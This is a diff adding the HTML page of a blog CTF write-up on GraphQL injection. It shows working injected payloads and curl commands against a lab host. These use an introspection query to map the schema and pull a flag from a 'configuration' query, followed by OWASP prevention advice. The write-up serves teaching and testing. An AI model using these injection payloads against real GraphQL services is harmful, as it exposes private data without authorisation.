@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="GraphQL is becoming more and more common nowadays and this challenge was the perfect way to digg into the subject and understand the flaws we can find there. Tl;Dr: After understanding the app is maki">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Misc CTF - GraphQL Injection">
+<meta property="og:url" content="https://hg8.sh/posts/misc-ctf/graphql-injection/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="GraphQL is becoming more and more common nowadays and this challenge was the perfect way to digg into the subject and understand the flaws we can find there. Tl;Dr: After understanding the app is maki">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/123524412-5f90e000-d6ca-11eb-918e-b95cfcb8766d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/123524479-ee056180-d6ca-11eb-8b81-3b0be64281e4.png">
+<meta property="article:published_time" content="2021-06-25T22:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-26T20:16:46.952Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="GraphQL Injection">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/123524412-5f90e000-d6ca-11eb-918e-b95cfcb8766d.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>Misc CTF - GraphQL Injection :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/sneakymailer/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GraphQL-Architecture"><span class="toc-number">2.</span> <span class="toc-text">GraphQL Architecture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GraphQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">GraphQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">5.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">6.</span> <span class="toc-text">Real Life Example</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Misc CTF - GraphQL Injection
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2021-06-25T22:00:00.000Z" itemprop="datePublished">26-06-2021</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      4 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>GraphQL is becoming more and more common nowadays and this challenge was the perfect way to digg into the subject and understand the flaws we can find there.</p>
+<p><strong>Tl;Dr:</strong> After understanding the app is making GraphQL request it was possible to inject arbritrary GraphQL queries. This way we could create an introspection query in order to retrieve more informations about the available Queries, Types, Fields. Mutations. etc. used by the server. With those informations it was then possible to forge a query to retrieve the flag.</p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge displays the following app:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/123524412-5f90e000-d6ca-11eb-918e-b95cfcb8766d.png" alt="egraph misc ctf"></p>
+<p>The app seems to only have one feature. Let’s open our browser Dev Tools to see what’s going on.</p>
+<p>When we make a simple search for “John” the following request is being made:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33435</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;filter&quot;</span>:<span class="string">&quot;John&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>And we get the following result:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>132</span><br><span class="line"><span class="attribute">ETag</span><span class="punctuation">: </span>W/&quot;84-W1Jl79yV42Y65MNzIB+8pLV3dM4&quot;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;findIndividuals&quot;</span>:[&#123;<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="attr">&quot;firstName&quot;</span>:<span class="string">&quot;John&quot;</span>,<span class="attr">&quot;lastName&quot;</span>:<span class="string">&quot;Doe&quot;</span>,<span class="attr">&quot;criminalRiskScore&quot;</span>:<span class="number">98</span>,<span class="attr">&quot;sex&quot;</span>:<span class="string">&quot;MALE&quot;</span>,<span class="attr">&quot;dob&quot;</span>:<span class="string">&quot;1949-06-08&quot;</span>&#125;]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>The format of requests and responses looks very like GraphQL queries. This would make sense given the name of the challenge.</p>
+<h2 id="GraphQL-Architecture"><a href="#GraphQL-Architecture" class="headerlink" title="GraphQL Architecture"></a>GraphQL Architecture</h2><p>If you are not familiar with GraphQL, here is the definition from the official website:</p>
+<blockquote>
+<p>GraphQL is a query language for APIs and a runtime for fulfilling those queries with your existing data. GraphQL provides a complete and understandable description of the data in your API, gives clients the power to ask for exactly what they need and nothing more, makes it easier to evolve APIs over time, and enables powerful developer tools.<br><a target="_blank" rel="noopener" href="https://graphql.org/">https://graphql.org/</a></p>
+</blockquote>
+<p>An interesting point is that GraphQL isn’t tied to any specific database and is instead backed by code. It means that, unlike REST APIs (where the client first interacts with arbitrary code written by programmer and this code reaches the database); the client first interacts with GraphQL, which in turn interacts with arbitrary code and ultimately ends talking to the database.</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/123524479-ee056180-d6ca-11eb-8b81-3b0be64281e4.png" alt="image"></p>
+<h2 id="GraphQL-Injection"><a href="#GraphQL-Injection" class="headerlink" title="GraphQL Injection"></a>GraphQL Injection</h2><p>When we try to input a classical quote <code>&quot;</code> in the search field the get the following error:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://misc.ctf:33436&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> --data-binary <span class="string">&#x27;&#123;&quot;filter&quot;:&quot;\&quot;&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;errors&quot;</span>:[&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Syntax Error: Unterminated string.&quot;</span>,<span class="string">&quot;locations&quot;</span>:[&#123;<span class="string">&quot;line&quot;</span>:<span class="number">1</span>,<span class="string">&quot;column&quot;</span>:<span class="number">96</span>&#125;]&#125;]&#125;% </span><br></pre></td></tr></table></figure>
+
+<p>Since I know nothing about GraphQL I checked the documentation of the <a target="_blank" rel="noopener" href="https://graphql.org/graphql-js/graphql-clients/"> Javascript Client</a>.<br>From the doc and the request result we can guess that the application backend is doing a query more or less like this:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">`query &#123; findIndividuals(filter: &quot;<span class="subst">$&#123;req.body.filter&#125;</span>&quot;) &#123; id, firstName, lastName, criminalRiskScore, sex, dob &#125; &#125;`</span>)</span><br></pre></td></tr></table></figure>
+
+<p>From there we can see how we could possibly inject custom queries. The idea is exactly the same as SQL Injection.</p>
+<p>First step is to craft a query to retrieve as much informations as possible from the database. We can do so using <a target="_blank" rel="noopener" href="https://graphql.org/learn/introspection/">GraphQL Introspection Query</a>.</p>
+<blockquote>
+<p>Introspection is the ability to query which resources are available in the current API schema. Given the API, via introspection, we can see the queries, types, fields, and directives it supports.</p>
+</blockquote>
+<p>Doing the following query should allow us to get all informations we need about the API schema:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__schema &#123;</span><br><span class="line">    types &#123;</span><br><span class="line">        name,</span><br><span class="line">        fields &#123;</span><br><span class="line">            name</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>So if we try to inject this query in the app, we should send something like this (the <code>#</code> at the end will comment the end of the line):</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;)&#123;firstname&#125;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;#&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>So the server will make the following query:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query &#123; <span class="function"><span class="title">findIndividuals</span>(<span class="params">filter: <span class="string">&quot;&quot;</span></span>)</span>&#123;firstname&#125;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;#&#125;<span class="string">&quot;) &#123; id, firstName, lastName, criminalRiskScore, sex, dob &#125; &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s send it:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://misc.ctf:33436/search&#x27;</span> --data-binary <span class="string">&#x27;&#123;&quot;filter&quot;:&quot;\&quot;)&#123;firstName&#125;__schema&#123;types&#123;name,fields&#123;name&#125;&#125;&#125;&#125;#&#125;&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;findIndividuals&quot;</span>:[&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;John&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Bob&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Jeremy&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Brenda&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Grace&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Marie&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Timothy&quot;</span>&#125;,&#123;<span class="string">&quot;firstName&quot;</span>:<span class="string">&quot;Robin&quot;</span>&#125;],<span class="string">&quot;__schema&quot;</span>:&#123;<span class="string">&quot;types&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Schema&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;types&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;queryType&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;mutationType&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;subscriptionType&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;directives&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;String&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Type&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;kind&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;fields&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;interfaces&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;possibleTypes&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;enumValues&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;inputFields&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ofType&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__TypeKind&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Field&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;args&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;type&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isDeprecated&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;deprecationReason&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__InputValue&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;type&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;defaultValue&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Boolean&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__EnumValue&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isDeprecated&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;deprecationReason&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__Directive&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;name&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;description&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;isRepeatable&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;locations&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;args&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;__DirectiveLocation&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Query&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;findIndividuals&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;configuration&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Individual&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;id&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;firstName&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;lastName&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;criminalRiskScore&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sex&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;dob&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125;]&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ID&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Int&quot;</span>,<span class="string">&quot;fields&quot;</span>:<span class="literal">null</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Configuration&quot;</span>,<span class="string">&quot;fields&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;value&quot;</span>&#125;]&#125;]&#125;&#125;&#125;%</span><br></pre></td></tr></table></figure>
+
+<p>Bingo we got plenty of data. Amongst the results we notice a <code>flag</code> field and an uncommon <code>configuration</code> query.</p>
+<p>Let’s forge a new query to see what we get get from the <code>configuration</code> query:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;)&#123;id&#125;configuration&#123;value&#125;&#125;#</span></span><br></pre></td></tr></table></figure>
+
+<p>We send it:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://misc.ctf:33436/search&#x27;</span> --data-binary <span class="string">&#x27;&#123;&quot;filter&quot;:&quot;\&quot;)&#123;id&#125;configuration&#123;value&#125;&#125;#&#125;&quot;&#125;&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;findIndividuals&quot;</span>:[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;3&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;4&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;5&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;7&quot;</span>&#125;],<span class="string">&quot;configuration&quot;</span>:&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;flag&#123;9r4pHql iNJ3Cti0N2!&#125;&quot;</span>&#125;&#125;&#125;% </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e">Discovering GraphQL endpoints and SQLi vulnerabilities</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2018/05/17/graphql-security-overview.html">GraphQL - Security Overview and Testing Tips</a></li>
+<li><a target="_blank" rel="noopener" href="https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/">Looting GraphQL Endpoints for Fun and Profit</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection">Top 1: Injection | OWASP</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-cheat-sheet">Injection Prevention Cheat Sheet | OWASP</a></li>
+</ul>
+<h2 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h2><p>Preventing injection requires keeping data separate from commands and queries.</p>
+<ul>
+<li>The preferred option is to use a safe API, which avoids the use of the interpreter entirely or provides a parameterized interface, or migrate to use Object Relational Mapping Tools (ORMs).</li>
+<li>Use positive or “whitelist” server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.</li>
+<li>For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter.</li>
+<li>Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</li>
+<li>See more: <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#injection-prevention-cheat-sheet">Injection Prevention Cheat Sheet | OWASP</a></li>
+</ul>
+<h2 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/489146">Confidential data of users and limited metadata of programs and reports accessible via GraphQL</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/489146"> </a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/489146">($20,000)</a><a target="_blank" rel="noopener" href="https://hackerone.com/reports/489146"> | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/435066">SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/645299">Private information exposed through GraphQL filters | HackerOne</a></li>
+<li><a target="_blank" rel="noopener" href="https://hackerone.com/reports/342978">Team object in GraphQL disclosed total number of whitelist | HackerOne</a></li>
+</ul>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/Misc/">Misc</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/GraphQL-Injection/" rel="tag">GraphQL Injection</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GraphQL-Architecture"><span class="toc-number">2.</span> <span class="toc-text">GraphQL Architecture</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GraphQL-Injection"><span class="toc-number">3.</span> <span class="toc-text">GraphQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">4.</span> <span class="toc-text">References</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention-Methods"><span class="toc-number">5.</span> <span class="toc-text">Prevention Methods</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Real-Life-Example"><span class="toc-number">6.</span> <span class="toc-text">Real Life Example</span></a></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
